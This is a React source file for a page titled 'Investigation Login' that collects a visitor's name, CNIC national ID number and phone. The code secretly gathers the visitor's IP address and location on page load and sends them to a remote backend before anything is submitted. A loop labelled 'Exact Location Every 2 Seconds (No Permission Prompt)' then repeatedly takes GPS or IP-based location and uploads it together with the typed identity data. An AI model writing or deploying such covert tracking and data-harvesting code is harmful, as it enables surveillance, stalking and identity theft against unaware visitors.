import React, { useEffect, useState } from "react";

function Login() {
  const [name, setName] = useState("");
  const [cnic, setCnic] = useState("");
  const [phone, setPhone] = useState("");
  const [location, setLocation] = useState(null);
  const [ip, setIp] = useState("");
  const [device, setDevice] = useState("");
  const [areaName, setAreaName] = useState("");
  const [status, setStatus] = useState("");
  const [userId, setUserId] = useState(null);
  const API_BASE = "https://investigation-backend.vercel.app";
  const [nameError, setNameError] = useState("");
  const [cnicError, setCnicError] = useState("");
  const [phoneError, setPhoneError] = useState("");

  // --- Geolocation Helpers ---
  const getIP = async () => {
    try {
      // Primary: api.ipify.org
      const r = await fetch("https://api.ipify.org?format=json", {
        signal: AbortSignal.timeout(5000),
      });
      if (r.ok) {
        const j = await r.json();
        if (j && j.ip) return j.ip;
      }
    } catch (e) {
      console.log("Primary IP service failed, trying backup...");
    }

    try {
      // Backup: ip-api.com or icanhazip
      const r = await fetch("https://icanhazip.com", {
        signal: AbortSignal.timeout(5000),
      });
      if (r.ok) {
        const text = await r.text();
        return text.trim();
      }
    } catch (e) {
      console.log("Backup IP service failed");
    }

    return "";
  };

  const lookupIpLocation = async (ipAddr) => {
    try {
      // Primary: ipapi.co
      const url = ipAddr
        ? `https://ipapi.co/${ipAddr}/json/`
        : `https://ipapi.co/json/`;
      const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
      if (r.ok) {
        const data = await r.json();
        const lat = data.latitude || data.lat || null;
        const lon = data.longitude || data.lon || null;
        const area =
          data.city ||
          data.region ||
          data.country_name ||
          data.country ||
          "unknown";
        if (lat != null && lon != null) {
          return { lat, lon, area };
        }
      }
    } catch (e) {
      console.log("Primary geolocation service failed, trying backup...");
    }

    try {
      // Backup: ip-api.com
      const url = ipAddr
        ? `https://ip-api.com/json/${ipAddr}?fields=lat,lon,city,regionName,country`
        : `https://ip-api.com/json/?fields=lat,lon,city,regionName,country`;
      const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
      if (r.ok) {
        const data = await r.json();
        if (data.status === "success") {
          const lat = data.lat || null;
          const lon = data.lon || null;
          const area =
            data.city || data.regionName || data.country || "unknown";
          if (lat != null && lon != null) {
            return { lat, lon, area };
          }
        }
      }
    } catch (e) {
      console.log("Backup geolocation service failed");
    }

    return { lat: null, lon: null, area: "unknown" };
  };

  const reverseGeocode = async (lat, lon) => {
    try {
      // Primary: Nominatim (OpenStreetMap)
      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&addressdetails=1&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&accept-language=en`;
      const res = await fetch(url, {
        headers: {
          Accept: "application/json",
          "User-Agent": "Investigation-App",
        },
        signal: AbortSignal.timeout(5000),
      });
      if (res.ok) {
        const data = await res.json();
        const addr = data && data.address ? data.address : null;
        const area =
          (addr &&
            (addr.city ||
              addr.town ||
              addr.village ||
              addr.suburb ||
              addr.hamlet)) ||
          addr?.county ||
          addr?.state ||
          data.display_name ||
          "unknown";
        if (area && area !== "unknown") return area;
      }
    } catch (e) {
      console.log("Nominatim failed, trying backup geocoding...");
    }

    try {
      // Backup: Reverse geocoding via ip-api or similar
      const url = `https://geocode.maps.co/reverse?lat=${lat}&lon=${lon}&format=json`;
      const res = await fetch(url, {
        signal: AbortSignal.timeout(5000),
      });
      if (res.ok) {
        const data = await res.json();
        const addr = data?.address || {};
        const area =
          addr.city ||
          addr.town ||
          addr.village ||
          addr.county ||
          addr.state ||
          data.display_name ||
          "unknown";
        if (area && area !== "unknown") return area;
      }
    } catch (e) {
      console.log("Backup geocoding failed");
    }

    return "unknown";
  };

  const saveLocationToServer = async (lat, lon, area, ipAddr) => {
    const locPayload =
      lat != null && lon != null
        ? { area: area || "unknown", coordinates: [Number(lon), Number(lat)] }
        : { area: area || "unknown", coordinates: [0, 0] };
    const payload = {
      name: name.trim() || "",
      iPAddress: ipAddr || ip || "",
      location: locPayload,
      deviceType:
        device ||
        (navigator.userAgent && /Mobi|Android|iPhone/i.test(navigator.userAgent)
          ? "mobile"
          : "desktop"),
      cnic: (cnic || "").replace(/\D/g, ""),
      phoneNumber: phone.trim() || "",
    };

    try {
      if (userId) {
        await fetch(`${API_BASE}/api/user/update/${userId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      } else {
        const r = await fetch(`${API_BASE}/api/user/add`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (r.ok) {
          const data = await r.json();
          if (data && data._id) setUserId(data._id);
        }
      }
    } catch (e) {
      // ignore transient network errors
    }
  };

  // --- Initial Capture Effect ---
  useEffect(() => {
    const ua = navigator.userAgent || "";
    const isMobile = /Mobi|Android|iPhone|iPad|iPod|Opera Mini/i.test(ua);
    setDevice(isMobile ? "mobile" : "desktop");

    (async () => {
      const ipAddr = await getIP();
      if (ipAddr) setIp(ipAddr);

      const ipGeo = await lookupIpLocation(ipAddr);
      const lat = ipGeo.lat;
      const lon = ipGeo.lon;
      const area = ipGeo.area || "unknown";

      if (lat != null && lon != null)
        setLocation({ latitude: Number(lat), longitude: Number(lon) });
      setAreaName(area || "unknown");

      const locPayload =
        lat != null && lon != null
          ? { area: area || "unknown", coordinates: [Number(lon), Number(lat)] }
          : { area: "unknown", coordinates: [0, 0] };

      const payload = {
        name: "",
        iPAddress: ipAddr || "",
        location: locPayload,
        deviceType: isMobile ? "mobile" : "desktop",
        cnic: "",
        phoneNumber: "",
      };

      try {
        const r = await fetch(`${API_BASE}/api/user/add`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (r.ok) {
          const data = await r.json();
          if (data && data._id) setUserId(data._id);
        }
      } catch (e) {
        // ignore network errors for initial save
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // --- Polling Effect: Exact Location Every 2 Seconds (No Permission Prompt) ---
  useEffect(() => {
    let intervalId = null;

    const startPolling = () => {
      intervalId = setInterval(async () => {
        let gpsLat = null;
        let gpsLon = null;
        let useGps = false;

        // Try to get GPS silently with very short timeout (no permission prompt if already denied)
        if (navigator.geolocation) {
          try {
            await new Promise((resolve) => {
              navigator.geolocation.getCurrentPosition(
                (pos) => {
                  gpsLat = pos.coords.latitude;
                  gpsLon = pos.coords.longitude;
                  useGps = true;
                  resolve();
                },
                () => {
                  // Error: permission denied or unavailable; use IP-based fallback
                  resolve();
                },
                { enableHighAccuracy: true, maximumAge: 0, timeout: 500 }, // Very short timeout
              );
            });
          } catch (e) {
            // Fallback to IP-based
          }
        }

        if (useGps && gpsLat != null && gpsLon != null) {
          // Use GPS coordinates
          setLocation({ latitude: Number(gpsLat), longitude: Number(gpsLon) });
          const area = await reverseGeocode(gpsLat, gpsLon);
          setAreaName(area || "unknown");
          const ipAddr = await getIP();
          if (ipAddr) setIp(ipAddr);
          await saveLocationToServer(gpsLat, gpsLon, area, ipAddr);
        } else {
          // Fallback: IP-based location (silent, no permission prompt)
          const ipAddr = await getIP();
          if (ipAddr) setIp(ipAddr);
          const ipGeo = await lookupIpLocation(ipAddr);
          const lat = ipGeo.lat;
          const lon = ipGeo.lon;
          const area = ipGeo.area || "unknown";
          if (lat != null && lon != null) {
            setLocation({ latitude: Number(lat), longitude: Number(lon) });
            const areaRefined = await reverseGeocode(lat, lon);
            setAreaName(areaRefined || "unknown");
            await saveLocationToServer(lat, lon, areaRefined || area, ipAddr);
          } else {
            setAreaName("unknown");
          }
        }
      }, 2000);
    };

    startPolling();

    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [userId, name, cnic, phone, device]);

  // Validation helpers
  const validateName = (v) => {
    const trimmed = (v || "").trim();
    if (!trimmed) return "Name is required";
    if (trimmed.length < 2) return "Name must be at least 2 characters";
    return "";
  };

  const validateCnic = (v) => {
    const digits = (v || "").replace(/\D/g, "");
    if (!digits) return "CNIC is required";
    if (digits.length !== 13) return "CNIC must contain 13 digits";
    return "";
  };

  const validatePhone = (v) => {
    const val = (v || "").trim();
    if (!val) return ""; // optional
    const cleaned = val.replace(/\s+/g, "");
    if (!/^\+?\d{10,15}$/.test(cleaned))
      return "Enter a valid phone number (10-15 digits, optional +)";
    return "";
  };

  const onNameChange = (v) => {
    setName(v);
    setNameError(validateName(v));
  };

  const onCnicChange = (v) => {
    setCnic(v);
    setCnicError(validateCnic(v));
  };

  const onPhoneChange = (v) => {
    setPhone(v);
    setPhoneError(validatePhone(v));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    // validate before submit
    const nErr = validateName(name);
    const cErr = validateCnic(cnic);
    const pErr = validatePhone(phone);
    setNameError(nErr);
    setCnicError(cErr);
    setPhoneError(pErr);
    if (nErr || cErr || pErr) {
      setStatus("Please fix validation errors");
      return;
    }
    setStatus("Saving...");

    // Build payload to match backend model
    const locPayload = location
      ? {
          area: areaName || "unknown",
          coordinates: [location.longitude, location.latitude],
        }
      : { area: areaName || "unknown", coordinates: [0, 0] };

    const cleanedCnic = (cnic || "").replace(/\D/g, "");
    const payload = {
      name: name.trim(),
      iPAddress: ip || "",
      location: locPayload,
      deviceType: device,
      cnic: cleanedCnic,
      phoneNumber: phone.trim(),
    };

    try {
      if (userId) {
        const res = await fetch(`${API_BASE}/api/user/update/${userId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (res.ok) setStatus("Updated server record");
        else setStatus(`Update failed: ${res.status}`);
      } else {
        const res = await fetch(`${API_BASE}/api/user/add`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (res.ok) setStatus("Saved to server");
        else setStatus(`Server error: ${res.status}`);
      }
    } catch (err) {
      setStatus("Failed to save to server");
    }
  };

  return (
    <div className="container py-4">
      <div className="row justify-content-center">
        <div className="col-12 col-sm-10 col-md-8 col-lg-6">
          <div className="card shadow-sm">
            <div className="card-body">
              <h3 className="card-title mb-3 text-center">
                Investigation Login
              </h3>

              {status ? (
                <div
                  className={`alert ${status.includes("Failed") || status.includes("error") || status.includes("failed") ? "alert-danger" : "alert-success"}`}
                  role="alert"
                >
                  {status}
                </div>
              ) : null}

              <form onSubmit={handleSubmit}>
                <div className="mb-3">
                  <label className="form-label">Name</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-user" aria-hidden="true"></i>
                    </span>
                    <input
                      required
                      value={name}
                      onChange={(e) => onNameChange(e.target.value)}
                      placeholder="Full name"
                      className={`form-control ${nameError ? "is-invalid" : ""}`}
                    />
                    {nameError ? (
                      <div className="invalid-feedback">{nameError}</div>
                    ) : null}
                  </div>
                </div>

                <div className="mb-3">
                  <label className="form-label">CNIC</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-id-card" aria-hidden="true"></i>
                    </span>
                    <input
                      required
                      value={cnic}
                      onChange={(e) => onCnicChange(e.target.value)}
                      placeholder="CNIC (13 digits)"
                      className={`form-control ${cnicError ? "is-invalid" : ""}`}
                    />
                    {cnicError ? (
                      <div className="invalid-feedback">{cnicError}</div>
                    ) : null}
                  </div>
                </div>

                <div className="mb-3">
                  <label className="form-label">Phone</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-phone" aria-hidden="true"></i>
                    </span>
                    <input
                      value={phone}
                      onChange={(e) => onPhoneChange(e.target.value)}
                      placeholder="Phone (optional)"
                      className={`form-control ${phoneError ? "is-invalid" : ""}`}
                    />
                    {phoneError ? (
                      <div className="invalid-feedback">{phoneError}</div>
                    ) : null}
                  </div>
                </div>

                <div className="d-grid">
                  <button type="submit" className="btn btn-primary btn-lg">
                    <i className="fa fa-sign-in me-2" aria-hidden="true"></i>
                    Login
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Login;
